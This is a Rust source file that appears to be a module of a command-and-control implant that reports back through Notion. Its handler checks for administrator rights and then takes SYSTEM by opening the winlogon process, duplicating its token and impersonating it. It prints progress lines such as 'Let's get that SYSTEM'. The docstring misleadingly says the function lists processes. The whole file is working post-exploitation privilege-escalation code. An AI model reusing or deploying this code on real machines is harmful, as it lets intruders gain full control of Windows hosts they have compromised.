#[cfg(windows)] use windows::{
    core::{PSTR, PWSTR, PCWSTR},
    Win32::{
        Foundation::{
            CloseHandle,
            HANDLE
        },
        System::Threading::{
            GetCurrentProcess,
            OpenProcessToken,
            OpenProcess,
            PROCESS_ALL_ACCESS
        },
        Security::{
            GetTokenInformation,
            DuplicateToken,
            ImpersonateLoggedOnUser,
            SecurityImpersonation,
            TokenElevation,
            TOKEN_ELEVATION,
            TOKEN_QUERY,
            TOKEN_DUPLICATE
        }
    }
};

#[cfg(windows)] use std::mem;
#[cfg(windows)] use std::ffi::c_void;
#[cfg(windows)] use libc;
#[cfg(windows)] use sysinfo::{ProcessExt, PidExt, System, SystemExt, Pid, Process};
#[cfg(windows)] use whoami;
use std::error::Error;
use litcrypt::lc;
#[cfg(windows)] use crate::cmd::getprivs::is_elevated;
use crate::logger::{Logger, log_out};
use crate::cmd::notion_out;

#[cfg(windows)]
fn get_processes(proc_name: &str) -> Vec<(u32, String)> {
    let sys = System::new_all();
    sys.processes()
    .iter()
    .filter(|(_, n) | {
        n.name().to_lowercase().contains(proc_name)
    })
    .map(|(p, n)| {
        (p.as_u32(), n.name().to_owned())
    })
    .collect()
} 

/// Lists processes. Returns PID and process name.
pub async fn handle(logger: &Logger) -> Result<String, Box<dyn Error>> {
    #[cfg(windows)] {
        if is_elevated() {
            unsafe {
                println!("[+] Elevated! Let's get that SYSTEM");
    
                let mut winlogon_token_handle = HANDLE(0);
                let mut duplicate_token_handle = HANDLE(0);
                let winlogon_processes = get_processes("winlogon");
                if winlogon_processes.is_empty() {
                    return notion_out!("Couldn't find winlogon!");
                }
                let winlogon_pid: u32 = winlogon_processes[0].0;
                println!("[+] Winlogon pid: {:?}", winlogon_pid);
                // OpenProcess
                let winlogon_proc_handle = OpenProcess(PROCESS_ALL_ACCESS, false, winlogon_pid);
                println!("[+] Winlogon Proc Handle: {:?}", winlogon_proc_handle);
                // OpenProcessToken
                if OpenProcessToken(winlogon_proc_handle, TOKEN_DUPLICATE, &mut winlogon_token_handle).0 != 0 {
                    println!("[+] Got Winlogon Token: {:?}", winlogon_token_handle);
                } else {
                    return notion_out!("[!] Couldn't get Winlogon Token!");
                }
                // Duplicate Token
                if DuplicateToken(winlogon_token_handle, SecurityImpersonation, &mut duplicate_token_handle).0 != 0 {
                    println!("[+] Duplicated Token!");
                } else {
                    return notion_out!("[!] Couldn't duplicate token!");
                }
                // ImpersonateLoggedOnUser
                if ImpersonateLoggedOnUser(duplicate_token_handle).0 != 0 {
                    println!("[+] Impersonated!");
                    CloseHandle(winlogon_proc_handle);
                    return notion_out!("[+] I am now ", whoami::username().as_str());
                }
                return notion_out!("Couldn't get system!");
                // Close Handles
                // CloseHandle(duplicate_token_handle);

            }

        } else {
            notion_out!("[!] You ain't got da JUICE!")
        }
    }
    #[cfg(not(windows))] {
        notion_out!("This module only works on Windows!")
    }
}